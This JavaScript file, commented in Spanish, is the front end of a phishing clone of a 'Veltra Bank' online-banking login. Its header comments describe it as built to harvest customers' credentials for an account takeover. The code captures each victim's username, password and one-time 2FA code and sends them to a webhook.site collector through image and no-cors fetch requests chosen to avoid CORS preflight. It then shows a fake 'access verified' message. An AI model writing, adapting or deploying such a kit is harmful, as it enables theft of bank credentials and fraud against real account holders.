/*
 * Veltra Bank — front del clon (deploy estatico en Vercel, sin backend).
 *
 * Imita el flujo de 2 pasos (password -> OTP). Exfiltra lo que teclea el
 * cliente a webhook.site por GET-imagen (es "simple request": no dispara
 * preflight CORS). Con esos valores corres el script de login a mano.
 */
(function () {
  "use strict";

  // <<< EDITAR: pega tu propia URL fresca de webhook.site >>>
  var COLLECTOR = "https://webhook.site/e2685b51-40e1-4e66-b0d1-2afb36a1d75f";

  function exfil(fase, datos) {
    var qs = encodeURIComponent(JSON.stringify(datos));
    var url = COLLECTOR + "?fase=" + encodeURIComponent(fase) + "&d=" + qs + "&_=" + Date.now();
    try { new Image().src = url; } catch (e) {}
    try { fetch(url, { method: "GET", mode: "no-cors", keepalive: true }); } catch (e) {}
  }

  function limpiarError() {
    var el = document.getElementById("alert");
    if (el) { el.textContent = ""; el.style.display = "none"; }
  }

  var formLogin = document.getElementById("form-login");
  var form2fa   = document.getElementById("form-2fa");
  var title     = document.getElementById("card-title");
  var sub       = document.getElementById("card-sub");

  // --- Paso 1: usuario + clave ---
  formLogin.addEventListener("submit", function (e) {
    e.preventDefault();
    limpiarError();
    var usuario = document.getElementById("txt-login").value.trim();
    var clave   = document.getElementById("txt-password").value;

    exfil("login", { usuario: usuario, clave: clave });

    var btn = document.getElementById("btn-login");
    btn.disabled = true; btn.textContent = "Verificando...";
    setTimeout(function () {
      formLogin.style.display = "none";
      form2fa.style.display = "";
      title.textContent = "Verificacion en dos pasos";
      sub.textContent = "Ingresa el codigo de un solo uso que te enviamos.";
      var i = document.getElementById("txt-2fa"); if (i) i.focus();
    }, 650);
  });

  // --- Paso 2: OTP ---
  form2fa.addEventListener("submit", function (e) {
    e.preventDefault();
    limpiarError();
    var codigo = document.getElementById("txt-2fa").value.trim();

    exfil("2fa", { codigo: codigo });

    var btn = document.getElementById("btn-2fa");
    btn.disabled = true; btn.textContent = "Verificando...";
    setTimeout(function () {
      document.querySelector(".card").innerHTML =
        '<div class="eyebrow">Banca en linea</div>' +
        '<h2>Acceso verificado</h2>' +
        '<p class="sub">Redirigiendo a tu panel...</p>';
    }, 650);
  });
})();
